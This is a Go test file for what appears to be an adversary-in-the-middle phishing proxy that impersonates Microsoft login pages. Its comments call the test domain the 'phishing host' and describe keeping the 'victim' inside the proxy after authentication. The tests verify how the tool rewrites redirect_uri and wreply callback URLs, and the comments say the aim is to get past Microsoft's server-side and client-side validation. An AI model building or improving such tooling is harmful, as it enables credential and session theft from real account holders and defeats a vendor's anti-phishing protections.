package proxy

import (
	"strings"
	"testing"
)

func TestProtectCallbackURLsKeepsReal(t *testing.T) {
	// redirect_uri (OAuth) is still protected: its host must stay the real origin
	// so Microsoft server-side validation sees a registered URI.
	body := []byte(`<a href="https://login-live.ms.test/resetpassword.aspx?redirect_uri=https://login.live.com/oauth20_authorize.srf%3Fclient_id%3Dx">reset</a>`)
	out, held := protectCallbackURLs(body)
	if len(held) != 1 {
		t.Fatalf("expected 1 protected callback, got %d", len(held))
	}
	// After protection the redirect_uri value must NOT be visible to the aliasing pass.
	if strings.Contains(string(out), "login.live.com") {
		t.Fatalf("redirect_uri value leaked into body before restore: %s", out)
	}
	// Restore must bring back the exact real redirect_uri (not aliased).
	restored := restoreCallbackURLs(out, held)
	if !strings.Contains(string(restored), "redirect_uri=https://login.live.com/oauth20_authorize.srf") {
		t.Fatalf("redirect_uri not preserved as real origin after restore: %s", restored)
	}
	if strings.Contains(string(restored), "redirect_uri=https://login-live.ms.test") {
		t.Fatalf("redirect_uri was aliased to phishing host: %s", restored)
	}
}

func TestRewriteOutboundHostsWildcard(t *testing.T) {
	m := &requestModifier{
		reverseAlias: map[string]string{},
		baseDomain:   "ms.test",
	}
	// Dynamic alias form <realhost>.<baseDomain> collapses to the real host.
	got := m.rewriteOutboundHosts("https://login.live.com.ms.test/foo")
	if got != "https://login.live.com/foo" {
		t.Fatalf("wildcard alias collapse failed: %q", got)
	}
	// Slug aliases (login-live.ms.test) are NOT mechanically reversible; they
	// must be left for the static reverseAlias map (here empty -> unchanged).
	gotSlug := m.rewriteOutboundHosts("https://login-live.ms.test/bar")
	if gotSlug != "https://login-live.ms.test/bar" {
		t.Fatalf("slug wrongly reversed: %q", gotSlug)
	}
	// A real host must be left untouched.
	got2 := m.rewriteOutboundHosts("https://login.live.com/baz")
	if got2 != "https://login.live.com/baz" {
		t.Fatalf("real host wrongly rewritten: %q", got2)
	}
}

func TestAliasForwardLocation(t *testing.T) {
	// A real host in a 3xx Location is pulled into the phishing namespace so the
	// victim stays in-proxy on the post-auth dashboard hop.
	loc := "https://www.office.com/landingv2?code=abc"
	got := aliasForwardLocation(loc, "ms.test", 9443, nil)
	if got != "https://www.office.com.ms.test:9443/landingv2?code=abc" {
		t.Fatalf("location forward-alias failed: %q", got)
	}
	// A host already inside the phishing namespace is left untouched.
	got2 := aliasForwardLocation("https://login.live.com.ms.test/foo", "ms.test", 443, nil)
	if got2 != "https://login.live.com.ms.test/foo" {
		t.Fatalf("already-aliased host wrongly rewritten: %q", got2)
	}
	// Hosts inside query parameters (redirect_uri/wreply) must NOT be aliased,
	// or Microsoft's server-side validation rejects the request.
	loc3 := "https://login.live.com/authorize?redirect_uri=https://www.office.com/landingv2"
	got3 := aliasForwardLocation(loc3, "ms.test", 443, nil)
	if strings.Contains(got3, "www.office.com.ms.test") {
		t.Fatalf("redirect_uri host was aliased: %q", got3)
	}
}

func TestHTMLWreplyAliasedToPhishing(t *testing.T) {
	// wreply must be aliased to the phishing host (same-host as the page) so
	// Microsoft's BrsConfig client-side validation passes; the engine
	// reverse-aliases it back to the real origin on the inbound request.
	html := `<html><body><a href="https://login.live.com/reset?wreply=https://login.live.com/back">x</a></body></html>`
	aliasOf := map[string]string{"login.live.com": "login.live.com.ms.test"}
	out, held := protectCallbackURLs([]byte(html))
	rewritten := rewriteHTMLHosts(out, aliasOf)
	restored := string(restoreCallbackURLs(rewritten, held))
	if !strings.Contains(restored, "wreply=https://login.live.com.ms.test/back") {
		t.Fatalf("wreply not aliased to phishing host: %s", restored)
	}
	if strings.Contains(restored, "wreply=https://login.live.com/back") {
		t.Fatalf("wreply leaked real origin: %s", restored)
	}
	// The outer href host (not a callback param) IS still aliased.
	if !strings.Contains(restored, `href="https://login.live.com.ms.test/reset?`) {
		t.Fatalf("outer href not aliased: %s", restored)
	}
}

func TestReverseAliasQueryWreply(t *testing.T) {
	// Inbound request: the aliased wreply must be collapsed back to the real
	// origin so Microsoft validates it server-side. Microsoft's config uses
	// SLUG aliases (login-live.ms.test), not the dynamic <host>.<baseDomain>
	// form, so the reverse-alias map (not just the wildcard) must do the work.
	m := &requestModifier{
		reverseAlias: map[string]string{"login-live.ms.test": "login.live.com"},
		baseDomain:   "ms.test",
	}
	// Slug form actually emitted by microsoft.json.
	q := "foo=bar&wreply=https://login-live.ms.test/oauth20_authorize.srf%3Fclient_id%3Dx"
	got := m.rewriteOutboundHosts(q)
	if !strings.Contains(got, "wreply=https://login.live.com/oauth20_authorize.srf") {
		t.Fatalf("slug wreply not reverse-aliased on inbound: %s", got)
	}
	if strings.Contains(got, "login-live.ms.test") {
		t.Fatalf("phishing host leaked to upstream: %s", got)
	}
	// Dynamic form must still reverse via the wildcard fallback.
	q2 := "wreply=https://login.live.com.ms.test/back"
	got2 := m.rewriteOutboundHosts(q2)
	if !strings.Contains(got2, "wreply=https://login.live.com/back") {
		t.Fatalf("dynamic wreply not reverse-aliased on inbound: %s", got2)
	}
	if strings.Contains(got2, "login.live.com.ms.test") {
		t.Fatalf("phishing host leaked to upstream (dynamic): %s", got2)
	}
}
